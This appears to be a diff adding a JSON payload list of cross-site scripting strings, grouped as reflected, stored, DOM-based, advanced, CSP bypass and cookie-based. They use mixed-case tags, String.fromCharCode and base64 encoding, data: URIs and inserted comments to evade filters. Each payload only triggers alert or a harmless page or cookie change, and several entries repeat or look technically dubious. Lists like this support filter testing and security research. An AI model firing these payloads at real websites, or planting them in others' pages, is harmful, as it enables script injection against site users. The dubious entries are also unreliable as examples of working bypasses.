@@ -1,0 +1,74 @@
+{
+  "reflected": [
+    "<ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>",
+    "<iMg sRc='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
+    "<SVG/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "<a href='javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>Click me</a>",
+    "<IfRaMe sRc='javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></IfRaMe>",
+    "<BoDy onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
+    "<ScRiPt>/* comment */alert(String.fromCharCode(88,83,83))</ScRiPt>",
+    "<iMg sRc='x' onerror='/* comment */eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
+    "<SVG/onload=/* comment */eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "<a href='javascript:/* comment */eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>Click me</a>"
+  ],
+  "stored": [
+    "<ScRiPt>alert(String.fromCharCode(83,116,111,114,101,100,32,88,83,83))</ScRiPt>",
+    "<iMg sRc='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,50,41))'>",
+    "<SVG/onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>",
+    "<a href='javascript:eval(String.fromCharCode(97,108,101,114,116,40,50,41))'>Click me (stored)</a>",
+    "<IfRaMe sRc='javascript:eval(String.fromCharCode(97,108,101,114,116,40,50,41))'></IfRaMe>",
+    "<BoDy onload='eval(String.fromCharCode(97,108,101,114,116,40,50,41))'>",
+    "<ScRiPt>/* comment */alert(String.fromCharCode(83,116,111,114,101,100,32,88,83,83))</ScRiPt>",
+    "<iMg sRc='x' onerror='/* comment */eval(String.fromCharCode(97,108,101,114,116,40,50,41))'>",
+    "<SVG/onload=/* comment */eval(String.fromCharCode(97,108,101,114,116,40,50,41))>",
+    "<a href='javascript:/* comment */eval(String.fromCharCode(97,108,101,114,116,40,50,41))'>Click me (stored)</a>"
+  ],
+  "dom_based": [
+    "<ScRiPt>document.body.innerHTML = '<h1>XSS</h1>';</ScRiPt>",
+    "<ScRiPt>document.getElementById('test').innerHTML = '<h1>XSS</h1>';</ScRiPt>",
+    "<InPuT type='text' value='<ScRiPt>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</ScRiPt>'>",
+    "<DiV onclick='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>Click me</DiV>",
+    "<a href='javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>Click here</a>",
+    "<ScRiPt>/* comment */document.body.innerHTML = '<h1>XSS</h1>';</ScRiPt>",
+    "<ScRiPt>/* comment */document.getElementById('test').innerHTML = '<h1>XSS</h1>';</ScRiPt>",
+    "<InPuT type='text' value='<ScRiPt>/* comment */eval(String.fromCharCode(97,108,101,114,116,40,49,41))</ScRiPt>'>",
+    "<DiV onclick='/* comment */eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>Click me</DiV>",
+    "<a href='javascript:/* comment */eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>Click here</a>"
+  ],
+  "advanced": [
+    "<ScRiPt>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</ScRiPt>",
+    "<ScRiPt>document.location='javascript:alert(1)';</ScRiPt>",
+    "<iMg sRc='data:image/svg+xml,<svg/onload=alert(1)>' />",
+    "<ScRiPt sRc='data:text/javascript,alert(1)'></ScRiPt>",
+    "<ObJeCt data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' type='text/html'></ObJeCt>",
+    "<ScRiPt>/* comment */eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</ScRiPt>",
+    "<ScRiPt>/* comment */document.location='javascript:alert(1)';</ScRiPt>",
+    "<iMg sRc='data:image/svg+xml,/* comment */<svg/onload=alert(1)>' />",
+    "<ScRiPt sRc='data:text/javascript,/* comment */alert(1)'></ScRiPt>",
+    "<ObJeCt data='data:text/html;base64,/* comment */PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' type='text/html'></ObJeCt>"
+  ],
+  "csp_bypass": [
+    "<ScRiPt sRc='data:text/javascript,alert(1)'></ScRiPt>",
+    "<iMg sRc='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' />",
+    "<IfRaMe sRc='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></IfRaMe>",
+    "<ScRiPt>eval('setTimeout(alert, 0, 1)');</ScRiPt>",
+    "<ScRiPt sRc='data:text/javascript,/* comment */alert(1)'></ScRiPt>",
+    "<iMg sRc='data:text/html;base64,/* comment */PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' />",
+    "<IfRaMe sRc='data:text/html;base64,/* comment */PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></IfRaMe>",
+    "<ScRiPt>/* comment */eval('setTimeout(alert, 0, 1)');</ScRiPt>",
+    "<ScRiPt sRc='data:text/javascript,alert(1)/* comment */'></ScRiPt>",
+    "<iMg sRc='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==/* comment */' />"
+  ],
+  "cookie_based": [
+    "<ScRiPt>document.cookie='user=admin;alert(1);'</ScRiPt>",
+    "<iMg sRc='x' onerror='document.cookie=\"user=admin;alert(1);\"'>",
+    "<ScRiPt>/* comment */document.cookie='user=admin;alert(1);'</ScRiPt>",
+    "<iMg sRc='x' onerror='/* comment */document.cookie=\"user=admin;alert(1);\"'>",
+    "<ScRiPt>document.cookie='user=admin;alert(1);/* comment */'</ScRiPt>",
+    "<iMg sRc='x' onerror='document.cookie=\"user=admin;alert(1);/* comment */\"'>",
+    "<ScRiPt>document.cookie='user=admin;alert(1);/* comment */'</ScRiPt>",
+    "<iMg sRc='x' onerror='document.cookie=\"user=admin;alert(1);/* comment */\"'>",
+    "<ScRiPt>document.cookie='user=admin;alert(1);/* comment */'</ScRiPt>",
+    "<iMg sRc='x' onerror='document.cookie=\"user=admin;alert(1);/* comment */\"'>"
+  ]
+}
